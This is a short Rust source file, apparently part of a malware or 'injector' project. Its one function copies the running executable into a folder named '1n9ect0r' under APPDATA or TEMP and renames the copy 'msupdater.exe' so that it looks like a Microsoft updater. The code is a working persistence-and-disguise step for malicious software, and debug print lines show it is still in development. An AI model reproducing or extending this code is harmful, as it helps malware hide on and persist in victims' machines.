use std::env;
use std::fs;
use std::path::PathBuf;



pub fn self_copying() -> std::io::Result<()> {
    let current_exe = env::current_exe()?;

    let mut dest_path = if let Ok(appdata) = env::var("APPDATA") {
        println!("[INFO] Using APPDATA directory: {}", appdata);
        PathBuf::from(appdata)
    } else {
        println!("[INFO] APPDATA not found, using TEMP directory: {:?}", env::temp_dir());
        env::temp_dir()
    };

    dest_path.push("1n9ect0r");
    if !dest_path.exists() {
        fs::create_dir_all(&dest_path)?;
        println!("[INFO] Created directory: {:?}", dest_path);
    }

    // let file_name = current_exe.file_name().unwrap_or_else(|| std::ffi::OsStr::new("msupdater.exe"));
    let file_name = "msupdater.exe";

    dest_path.push(file_name);
    fs::copy(&current_exe, &dest_path)?;

    println!("[INFO] Copied executable to: {:?}", dest_path);

    Ok(())
}